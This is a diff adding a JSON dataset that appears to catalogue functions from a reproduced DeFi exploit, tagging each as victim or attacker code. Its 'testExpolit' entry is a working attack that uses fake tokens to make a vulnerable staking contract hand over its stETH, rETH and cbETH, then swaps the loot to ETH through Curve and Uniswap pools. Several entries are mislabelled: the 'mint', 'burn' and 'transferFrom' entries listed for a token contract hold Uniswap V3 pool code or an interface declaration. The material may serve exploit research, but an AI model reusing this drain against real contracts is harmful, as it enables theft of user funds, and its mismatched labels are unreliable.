@@ -1,0 +1,226 @@
+[
+  {
+    "contract/interface": "Vulnerable",
+    "source_type": "victim_contract",
+    "function_name": "claim",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Vulnerable",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"https://rpc.ankr.com/eth\", 18_448_167);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExpolit",
+    "original_code": "    function testExpolit() public {\n        address[] memory stakedTokens = new address[](3);\n        stakedTokens[0] = address(stETH);\n        stakedTokens[1] = address(rETH);\n        stakedTokens[2] = address(cbETH);\n        deal(address(this), 0);\n        uint256[] memory balances = new uint256[](3);\n        emit log_named_decimal_uint(\"Attacker Eth balance before attack:\", address(this).balance, 18);\n        for (uint8 i = 0; i < stakedTokens.length; i++) {\n            uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));\n            balances[i] = staked_bal;\n            MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);\n            fake_token.mint(10_000 * 1e18);\n            fake_token.approve(address(vulnerable), type(uint256).max);\n\n            vulnerable.withdraw(address(fake_token), staked_bal);\n            vulnerable.claim(i);\n        }\n\n        //changing stETH to eth\n        stETH.approve(address(LidoCurvePool), balances[0]);\n        LidoCurvePool.exchange(1, 0, balances[0], 0);\n\n        //changing rETH to weth\n        rETH.approve(address(rETHPool), balances[1]);\n        rETHPool.swap(address(this), true, int256(balances[1]), 4_295_128_740, new bytes(0));\n\n        //changing cbETH to weth\n        cbETH.approve(address(cbETHPool), balances[2]);\n        cbETHPool.swap(address(this), true, int256(balances[2]), 4_295_128_740, new bytes(0));\n\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"Attacker Eth balance after attack:\", address(this).balance, 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ASTTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(IuniswapV3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(IuniswapV3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "burn",
+    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        (Position.Info storage position, int256 amount0Int, int256 amount1Int) =\n            _modifyPosition(\n                ModifyPositionParams({\n                    owner: msg.sender,\n                    tickLower: tickLower,\n                    tickUpper: tickUpper,\n                    liquidityDelta: -int256(amount).toInt128()\n                })\n            );\n\n        amount0 = uint256(-amount0Int);\n        amount1 = uint256(-amount1Int);\n\n        if (amount0 > 0 || amount1 > 0) {\n            (position.tokensOwed0, position.tokensOwed1) = (\n                position.tokensOwed0 + uint128(amount0),\n                position.tokensOwed1 + uint128(amount1)\n            );\n        }\n\n        emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    struct SwapCache {\n        // the protocol fee for the input token\n        uint8 feeProtocol;\n        // liquidity at the beginning of the swap\n        uint128 liquidityStart;\n        // the timestamp of the current block\n        uint32 blockTimestamp;\n        // the current value of the tick accumulator, computed only if we cross an initialized tick\n        int56 tickCumulative;\n        // the current value of seconds per liquidity accumulator, computed only if we cross an initialized tick\n        uint160 secondsPerLiquidityCumulativeX128;\n        // whether we've computed and cached the above two accumulators\n        bool computedLatestObservation;\n    }\n\n    // the top level state of the swap, the results of which are recorded in storage at the end\n    struct SwapState {\n        // the amount remaining to be swapped in/out of the input/output asset\n        int256 amountSpecifiedRemaining;\n        // the amount already swapped out/in of the output/input asset\n        int256 amountCalculated;\n        // current sqrt(price)\n        uint160 sqrtPriceX96;\n        // the tick associated with the current price\n        int24 tick;\n        // the global fee growth of the input token\n        uint256 feeGrowthGlobalX128;\n        // amount of input token paid as protocol fee\n        uint128 protocolFee;\n        // the current liquidity in range\n        uint128 liquidity;\n    }\n\n    struct StepComputations {\n        // the price at the beginning of the step\n        uint160 sqrtPriceStartX96;\n        // the next tick to swap to from the current tick in the swap direction\n        int24 tickNext;\n        // whether tickNext is initialized or not\n        bool initialized;\n        // sqrt(price) for the next tick (1/0)\n        uint160 sqrtPriceNextX96;\n        // how much is being swapped in in this step\n        uint256 amountIn;\n        // how much is being swapped out\n        uint256 amountOut;\n        // how much fee is being paid in\n        uint256 feeAmount;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        require(amount > 0);\n        (, int256 amount0Int, int256 amount1Int) =\n            _modifyPosition(\n                ModifyPositionParams({\n                    owner: recipient,\n                    tickLower: tickLower,\n                    tickUpper: tickUpper,\n                    liquidityDelta: int256(amount).toInt128()\n                })\n            );\n\n        amount0 = uint256(amount0Int);\n        amount1 = uint256(amount1Int);\n\n        uint256 balance0Before;\n        uint256 balance1Before;\n        if (amount0 > 0) balance0Before = balance0();\n        if (amount1 > 0) balance1Before = balance1();\n        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);\n        if (amount0 > 0) require(balance0Before.add(amount0) <= balance0(), 'M0');\n        if (amount1 > 0) require(balance1Before.add(amount1) <= balance1(), 'M1');\n\n        emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "scaledBalanceOf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "scaledBalanceToBal",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "scaledBalanceToBalance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "stakedTokenAddr",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "stakedTokenAddress",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MyERC20",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IuniswapV3",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IuniswapV3",
+    "source_type": "victim_contract",
+    "function_name": "token0",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IuniswapV3",
+    "source_type": "victim_contract",
+    "function_name": "token1",
+    "original_code": "",
+    "description": ""
+  }
+]
